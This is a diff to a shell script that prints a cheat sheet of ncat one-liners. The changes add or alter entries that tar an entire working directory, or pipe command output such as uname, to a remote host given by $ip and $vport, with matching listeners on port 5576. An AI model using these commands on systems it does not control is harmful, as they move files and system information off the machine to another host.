@@ -51,9 +51,13 @@ echo -e "
 \t${IGreen}├──${clear} ${Green}ncat $ip $vport < \$PWD/share.EXT${clear}
 \t${IGreen}└──${clear} ${Green}ncat -vl -k 5576 > saved ${clear}
 
-[${Green}✔${clear}] ${IYellow}SHARE SUBDIRECTORY QUICKLY${clear}
-\t${IGreen}├──${clear} ${Green}tar zcfP - fi_files | ncat $ip $vport${clear}
+[${Green}✔${clear}] ${IYellow}RECEIVE SUBDIRECTORY QUICKLY${clear}
+\t${IGreen}├──${clear} ${Green}tar zcfP - * | ncat $ip $vport${clear}
 \t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 | tar xvpz${clear}
+
+[${Green}✔${clear}] ${IYellow}SEND SUBDIRECTORY QUICKLY${clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport |tar xvpz ${clear}
+\t${IGreen}└──${clear} ${Green}tar zcfP - *| ncat -l 5576 ${clear}
 
 [${Green}✔${clear}] ${IYellow}USE ANY COMMAND SAVE OUTPUT${clear}
 \t${IGreen}├──${clear} ${Green}uname | ncat $ip $vport${clear}
